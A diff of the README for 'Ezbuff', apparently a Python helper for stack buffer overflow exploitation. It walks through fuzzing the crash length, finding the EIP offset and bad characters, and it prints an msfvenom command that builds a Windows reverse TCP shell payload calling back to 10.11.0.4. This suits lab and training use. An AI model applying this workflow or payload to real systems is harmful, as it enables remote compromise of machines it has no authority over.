@@ -49,17 +49,18 @@ Description: # Ezbuff
         	# Sets the number of bytes to crash the application.
         	# Make sure to accommodate space for reverse shell!!
         	# [!] this should be set after running `fuzz` for the remainder of the process
-        	obj.num_bytes_crash = 1500
+        	obj.num_bytes_crash = 1300
         
         	# Sending pattern to determine offset
         	# [*] the length of the pattern is determined by the `num_bytes_crash` property
         	# 	  which is the number of bytes it took to crash the application plus the number
         	#     of bytes you allocate for your shell code later on. This should require 
-        	#     an additional 300-400 bytes. Ex. During my test run it took around 800
+        	#     an additional 300-400 bytes
         	obj.send_pattern()
         
         	# Get offset
         	# pass in the value that overwrote the eip register and get offset
+        	# Get offset 
         	offset = obj.get_offset("30416B30")
         	print(offset)
         
@@ -82,6 +83,7 @@ Description: # Ezbuff
         	# Send payload with all characters to find bad characters.
         	# [!] bad characters are removed depending on the characters passed
         	#     as arguments to the `add_bad_char` function
+        	# Send payload with all characters to find bad characters
         	obj.send_bad_chars()
         
         	# Set the memory address to jump to after finding valid memory address
@@ -132,7 +134,7 @@ Description: # Ezbuff
         ## Generating payload
         ```bash
         # Sample payload with Msfvenom:
-         msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=1337 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\3d"
+        msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=1337 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\3d"
         
         # Or use Vengen (https://github.com/binexisHATT/Vengen) to generate payloads with your custom options!
         ```
